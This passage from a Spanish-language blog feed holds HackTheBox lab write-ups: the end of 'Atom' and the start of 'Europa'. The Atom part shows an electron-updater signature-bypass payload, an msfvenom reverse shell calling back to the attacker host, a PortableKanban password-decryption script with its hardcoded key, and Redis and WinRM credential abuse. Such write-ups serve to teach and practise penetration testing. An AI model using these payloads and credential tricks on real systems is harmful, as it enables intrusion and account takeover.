&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb 10.10.10.237
http://10.10.10.237 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[MrR3boot@atom.htb], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.10.10.237], OpenSSL[1.1.1j], PHP[7.3.27], Script, Title[Heed Solutions]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta no nos reporta que estamos ante un &lt;code&gt;php&lt;/code&gt;, y si procedemos a abrir el servicio en el navegador vemos que pagina hace referencia a &lt;code&gt;heed Solutions&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Atom/atom1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora bien &lt;code&gt;nmap&lt;/code&gt; nos reporto que el puerto &lt;code&gt;445&lt;/code&gt; se encuentra abierto, asi que vamos a tratar de enumerar si existen recursos compartidos. Para ello usaremos &lt;code&gt;smbmap&lt;/code&gt; de la suite de &lt;code&gt;impacket&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.237 -u 'null'
[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Software_Updates                                  	READ, WRITE	
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que tenemos permiso de lectura y ejecución en &lt;code&gt;Software_Updates&lt;/code&gt;, asi que vamos a listar los recursos que contiene.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.237 -u 'null' -r 'Software_Updates'
[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Software_Updates                                  	READ, WRITE	
	.\Software_Updates\*
	dr--r--r--                0 Fri Aug 11 00:51:43 2023	.
	dr--r--r--                0 Fri Aug 11 00:51:43 2023	..
	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client1
	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client2
	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client3
	fr--r--r--            35202 Fri Apr  9 11:18:08 2021	UAT_Testing_Procedures.pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a traernos a nuestra maquina y abrir el archivo pdf.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbmap -H 10.10.10.237 -u 'null' --download 'Software_Updates/UAT_Testing_Procedures.pdf'
[+] Starting download: Software_Updates\UAT_Testing_Procedures.pdf (35202 bytes)
[+] File output to: /home/fmiracle/Machines/Aton/content/10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf
❯ ls
 10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf
❯ mv 10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf UAT_Testing_Procedures.pdf
❯ ls
 UAT_Testing_Procedures.pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si lo queremos ver en nuestro navegador, yo voy a compartirme un servicio web con &lt;code&gt;php&lt;/code&gt;, pero tu puedes hacerlo como mas te guste.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php -S 0.0.0.0:80
[Fri Aug 11 00:56:38 2023] PHP 7.4.33 Development Server (http://0.0.0.0:80) started
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Atom/atom2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que contiene información acerca de una aplicación en &lt;code&gt;electron-builder&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Si bajamos un poco observamos qmas información donde nos dice que para iniciar el proceso QA debemos de poner las actualizaciones en uno de los directorios con el nombre &lt;code&gt;client&lt;/code&gt; que curiosamente son los mismo cuando listamos los recursos compartidos con &lt;code&gt;smbmap&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Electron - builder : Una solución completa para empaquetar y crear una aplicación Electron lista para su distribución para macOS, Windows y Linux con soporte de “actualización automática”.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Si buscamos vulnerabilidades asociadas a &lt;code&gt;electron builder&lt;/code&gt;, encontramos  una de evasión de la validación de firmas que conduce a &lt;code&gt;RCE&lt;/code&gt; en Electron-Updater.&lt;/p&gt;

&lt;p&gt;Basicamente esta vulnerabilidad se aprovecha de &lt;code&gt;Electron-Updater&lt;/code&gt; y nos permite ejecutar codigo malicioso en el software.&lt;/p&gt;

&lt;p&gt;Te dejo el articulo para que puedas entenderlo mejor:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html&quot;&gt;electron-updater-update-signature-bypass&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Atom/atom3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para poder explotarla vamos a utilizar una estructura similar a la que nos comparten en el articulo y le pondremos la extensión &lt;code&gt;yml&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;version: 1.2.3
path: http://10.10.16.2/test
sha512: fjqwiofhqw21321 21ie21e2r
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En la parte de &lt;code&gt;path&lt;/code&gt; vamos a indicarle que al ejecutarse realize una petición a nuestra ip, donde nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt;. Y seguidamente vamos a subir en una de las carpetas &lt;code&gt;client&lt;/code&gt; nuestro archivo &lt;code&gt;yaml&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ smbclient  //10.10.10.237/Software_Updates -N
Try &quot;help&quot; to get a list of possible commands.
smb: \&amp;gt; dir
  .                                   D        0  Fri Aug 11 01:18:55 2023
  ..                                  D        0  Fri Aug 11 01:18:55 2023
  client1                             D        0  Fri Aug 11 01:18:55 2023
  client2                             D        0  Fri Aug 11 01:18:55 2023
  client3                             D        0  Fri Aug 11 01:18:55 2023
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 11:18:08 2021

		4413951 blocks of size 4096. 1369525 blocks available
smb: \&amp;gt; cd client1
smb: \client1\&amp;gt; put latest.yml
putting file latest.yml as \client1\latest.yml (0,1 kb/s) (average 0,1 kb/s)
smb: \client1\&amp;gt; dir
  .                                   D        0  Fri Aug 11 01:21:33 2023
  ..                                  D        0  Fri Aug 11 01:21:33 2023
  latest.yml                          A       79  Fri Aug 11 01:21:33 2023

		4413951 blocks of size 4096. 1369525 blocks available
smb: \client1\&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de unos segundos recibimos la conexión, lo cual nos garantiza que efectivamente estamos aprovechandonos de la vulnerabilidad.&lt;/p&gt;

&lt;p&gt;Lo que vamos a hacer ahora es crearnos un ejecutable malicioso con la ayuda de &lt;code&gt;msfvenom&lt;/code&gt; para poder obtener una reverse shell de la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una cosa a recalcar que como nos dice el articulo el archivo debemos de llamarlo de una forma especial usando el simbolo &lt;code&gt;’&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mv reverse.exe r’everse.exe
❯ ls
 latest.yml   r’everse.exe   UAT_Testing_Procedures.pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ademas debemos de modificar nuestro archivo &lt;code&gt;yml&lt;/code&gt; especificando en el path el archivo y no olvidemos incluir el sha512 del ejecutable.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ sha512sum r’everse.exe
d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31  r’everse.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El archivo nos quedaria de la siguiente forma:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;version: 1.2.3
path: r’everse.exe 
sha512: d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Procedemos a subirlo en una de las carpetas &lt;code&gt;client&lt;/code&gt;, compartimos el ejecutable desde nuestra maquina con python y nos ponemos en escucha en el puerto establecido con &lt;code&gt;ncat&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Recibimos la conexión como el usuario &lt;code&gt;jason&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.237.
Connection from 10.10.10.237:54130.
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

whoami
whoami
atom\jason
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos dirigirnos a su directorio personal y leer la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Users\jason\Desktop

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Desktop

04/02/2021  10:29 PM    &amp;lt;DIR&amp;gt;          .
04/02/2021  10:29 PM    &amp;lt;DIR&amp;gt;          ..
03/31/2021  02:09 AM             2,353 heedv1.lnk
03/31/2021  02:09 AM             2,353 heedv2.lnk
03/31/2021  02:09 AM             2,353 heedv3.lnk
08/10/2023  05:27 PM                34 user.txt
               4 File(s)          7,093 bytes
               2 Dir(s)   5,622,317,056 bytes free

type user.txt
type user.txt
5dcbc34fb2b0acaf6f9262acb7ec960e
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;elevacion-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#elevacion-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Si enumeramos un poco el sistema, vemos en la carpeta Download un directorio referente a &lt;code&gt;PortableKanban&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd Downloads

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Downloads

04/02/2021  08:00 AM    &amp;lt;DIR&amp;gt;          .
04/02/2021  08:00 AM    &amp;lt;DIR&amp;gt;          ..
03/31/2021  02:36 AM    &amp;lt;DIR&amp;gt;          node_modules
04/02/2021  08:21 PM    &amp;lt;DIR&amp;gt;          PortableKanban
               0 File(s)              0 bytes
               4 Dir(s)   5,622,136,832 bytes free

C:\Users\jason\Downloads&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si listamos el contenido obervamos varios archivos &lt;code&gt;dll&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd PortableKanban

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9793-C2E6

 Directory of C:\Users\jason\Downloads\PortableKanban

04/02/2021  08:21 PM    &amp;lt;DIR&amp;gt;          .
04/02/2021  08:21 PM    &amp;lt;DIR&amp;gt;          ..
02/27/2013  08:06 AM            58,368 CommandLine.dll
11/08/2017  01:52 PM           141,312 CsvHelper.dll
06/22/2016  09:31 PM           456,704 DotNetZip.dll
04/02/2021  07:44 AM    &amp;lt;DIR&amp;gt;          Files
11/23/2017  04:29 PM            23,040 Itenso.Rtf.Converter.Html.dll
11/23/2017  04:29 PM            75,776 Itenso.Rtf.Interpreter.dll
11/23/2017  04:29 PM            32,768 Itenso.Rtf.Parser.dll
11/23/2017  04:29 PM            19,968 Itenso.Sys.dll
11/23/2017  04:29 PM           376,832 MsgReader.dll
07/03/2014  10:20 PM           133,296 Ookii.Dialogs.dll
04/02/2021  07:17 AM    &amp;lt;DIR&amp;gt;          Plugins
04/02/2021  08:22 PM             5,920 PortableKanban.cfg
01/04/2018  09:12 PM           118,184 PortableKanban.Data.dll
01/04/2018  09:12 PM         1,878,440 PortableKanban.exe
01/04/2018  09:12 PM            31,144 PortableKanban.Extensions.dll
04/02/2021  07:21 AM               172 PortableKanban.pk3.lock
09/06/2017  12:18 PM           413,184 ServiceStack.Common.dll
09/06/2017  12:17 PM           137,216 ServiceStack.Interfaces.dll
09/06/2017  12:02 PM           292,352 ServiceStack.Redis.dll
09/06/2017  04:38 AM           411,648 ServiceStack.Text.dll
01/04/2018  09:14 PM         1,050,092 User Guide.pdf
              19 File(s)      5,656,416 bytes
               4 Dir(s)   5,625,991,168 bytes free
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si tratamos de buscar vulnerabilidades asociadas a &lt;code&gt;PortableKanban&lt;/code&gt;, vemos un exploit con el podemos desencriptar una contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit portablekanban
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
PortableKanban 4.3.6578.38136 - Encrypted Password Ret | windows/local/49409.py
------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vimos anteriormente cuando listamos los archivos de &lt;code&gt;portablekanban&lt;/code&gt; un archivo de configuración &lt;code&gt;PortableKanban.cfg&lt;/code&gt; que si lo leemos encontramos una contraseña encryptada.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;type PortableKanban.cfg
{&quot;RoamingSettings&quot;:{&quot;DataSource&quot;:&quot;RedisServer&quot;,&quot;DbServer&quot;:&quot;localhost&quot;,&quot;DbPort&quot;:6379,&quot;DbEncPassword&quot;:&quot;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&quot;,&quot;DbServer2&quot;:&quot;&quot;,&quot;DbPort2&quot;:6379,&quot;DbEncPassword2&quot;:&quot;&quot;,&quot;DbIndex&quot;:0,&quot;DbSsl&quot;:false,&quot;DbTimeout&quot;:10,&quot;FlushChanges&quot;:true,&quot;UpdateInterval&quot;:5,&quot;AutoUpdate&quot;:true,&quot;Caption&quot;:&quot;My Tasks&quot;,&quot;RightClickAction&quot;:&quot;Nothing&quot;,&quot;DateTimeFormat&quot;:&quot;ddd, M/d/yyyy h:mm tt&quot;,&quot;BoardForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;BoardBackColor&quot;:&quot;DimGray&quot;,&quot;ViewTabsFont&quot;:&quot;Segoe UI, 9pt&quot;,&quot;SelectedViewTabForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;SelectedViewTabBackColor&quot;:&quot;Black&quot;,&quot;HeaderFont&quot;:&quot;Segoe UI, 11.4pt&quot;,&quot;HeaderShowCount&quot;:true,&quot;HeaderShowLimit&quot;:true,&quot;HeaderShowEstimates&quot;:true,&quot;HeaderShowPoints&quot;:false,&quot;HeaderForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;HeaderBackColor&quot;:&quot;Gray&quot;,&quot;CardFont&quot;:&quot;Segoe UI, 11.4pt&quot;,&quot;CardLines&quot;:3,&quot;CardTextAlignment&quot;:&quot;Center&quot;,&quot;CardShowMarks&quot;:true,&quot;CardShowInitials&quot;:false,&quot;CardShowTags&quot;:true,&quot;ThickTags&quot;:false,&quot;DefaultTaskForeColor&quot;:&quot;WhiteSmoke&quot;,&quot;DefaultTaskBackColor&quot;:&quot;Gray&quot;,&quot;SelectedTaskForeColor&quot;:
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Recordemos que los archivos de configuración muchas veces contienen contraseñas ya sean encriptadas o en texto claro.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Como ya contamos con una contraseña, ahora vamos a modificar un poco el exploit de tal manera que nos muestre la contraseña en texto claro.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import json
import base64
from des import * #python3 -m pip install des
import sys

hash = 'Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb'

hash = base64.b64decode(hash.encode('utf-8'))
key = DesKey(b&quot;7ly6UznJ&quot;)
print(key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode('utf-8'))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el exploit y obtenemos la contraseña en texto claro.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 portable.py
kidvscat_yes_kidvscat
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos tratar de conectarnos como el usuario administrador con la contraseña obtenida, pero no resulta ser la correcta. Pero otro punto a recalcar es que en el archivo de configuración vemos algo de &lt;code&gt;RedisServer&lt;/code&gt;, asi que podemos tratar de conectarnos al servicio de &lt;code&gt;redis&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ redis-cli -h 10.10.10.237
10.10.10.237:6379&amp;gt; auth kidvscat_yes_kidvscat
OK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder enumerar el servicio podemos apoyarnos de &lt;code&gt;hacktricks&lt;/code&gt;, te dejo el recurso aqui:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis&quot;&gt;https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Podemos listar las KEYS disponibles y listar&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;10.10.10.237:6379&amp;gt; KEYS *
1) &quot;pk:ids:User&quot;
2) &quot;pk:ids:MetaDataClass&quot;
3) &quot;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;
4) &quot;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff&quot;
10.10.10.237:6379&amp;gt; GET pk:ids:User
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.10.237:6379&amp;gt; GET pk:ids:MetaDataClass
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.10.237:6379&amp;gt; GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
&quot;{\&quot;Id\&quot;:\&quot;e8e29158d70d44b1a1ba4949d52790a0\&quot;,\&quot;Name\&quot;:\&quot;Administrator\&quot;,\&quot;Initials\&quot;:\&quot;\&quot;,\&quot;Email\&quot;:\&quot;\&quot;,\&quot;EncryptedPassword\&quot;:\&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\&quot;,\&quot;Role\&quot;:\&quot;Admin\&quot;,\&quot;Inactive\&quot;:false,\&quot;TimeStamp\&quot;:637530169606440253}&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Obtenemos una contraseña enctryptada &lt;code&gt;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&lt;/code&gt; con el mismo formato que la anterior que encontramos, asi que podemos usar el mismo exploit que previamente usamos para decencriptarla.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import json
import base64
from des import * #python3 -m pip install des
import sys

hash = 'Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi'

hash = base64.b64decode(hash.encode('utf-8'))
key = DesKey(b&quot;7ly6UznJ&quot;)
print(key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode('utf-8'))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejectamos nuevamente el exploit y obtenemos una nueva contraseña.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 portable.py
kidvscat_admin_@123
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos a intentar con esta nueva conectarnos como el usuario &lt;code&gt;Administrator&lt;/code&gt; usando &lt;code&gt;winrm&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ evil-winrm -i 10.10.10.237 -u 'Administrator' -p 'kidvscat_admin_@123'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; whoami
atom\administrator
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos conectamos satisfactoriamente y ahora podemos dirigirnos al directorio personal del usuario &lt;code&gt;Administrator&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         8/10/2023   5:27 PM             34 root.txt


Evil-WinRM* PS C:\Users\Administrator\Desktop&amp;gt; type root.txt
f55c47e3b749e8ae956f980fba1dc782
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Thu, 10 Aug 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Atom</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Atom</guid>
        
        <category>SMB Enumeration</category>
        
        <category>Abusing electron updater</category>
        
        <category>Signature Validation Bypass RCE</category>
        
        <category>Abusing PortableKanban</category>
        
        <category>Redis Enumeration</category>
        
        <category>Abusing WinRM</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Europa - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Europa&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad media, en esta ocasión comprometeremos el sistema a traves de una inyección sql a un panel de login de un dominio expuesto en los &lt;code&gt;CommonNames&lt;/code&gt;, ademas adicionalmente explotaremos una &lt;code&gt;blind sql&lt;/code&gt; haciendo scripting en &lt;code&gt;python&lt;/code&gt;. Una vez ya en el dashboard nos aprovecharemos de una vulnerabilidad de &lt;code&gt;regex&lt;/code&gt; que nos permitira visualizar la primera flag del sistema y finalmente para convertirnos en el usuario &lt;code&gt;root&lt;/code&gt; nos aprovecharemos de una tarea &lt;code&gt;cron&lt;/code&gt; en la que manipularemos el permiso de la &lt;code&gt;bash&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina curiosa asi que vamos a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Europa
❯ ls

 Europa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.22
PING 10.10.10.22 (10.10.10.22) 56(84) bytes of data.
64 bytes from 10.10.10.22: icmp_seq=1 ttl=63 time=132 ms

--- 10.10.10.22 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 131.781/131.781/131.781/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt; y por proximidad seria correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.22 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-07 01:20 GMT
Initiating SYN Stealth Scan at 01:20
Scanning 10.10.10.22 [65535 ports]
Discovered open port 22/tcp on 10.10.10.22
Discovered open port 443/tcp on 10.10.10.22
Discovered open port 80/tcp on 10.10.10.22
Completed SYN Stealth Scan at 01:20, 26.93s elapsed (65535 total ports)
Nmap scan report for 10.10.10.22
Host is up, received user-set (0.15s latency).
Scanned at 2023-08-07 01:20:05 GMT for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.06 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 25 (1.100KB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80,443 10.10.10.22 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-07 01:22 GMT
Nmap scan report for 10.10.10.22
Host is up (0.24s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
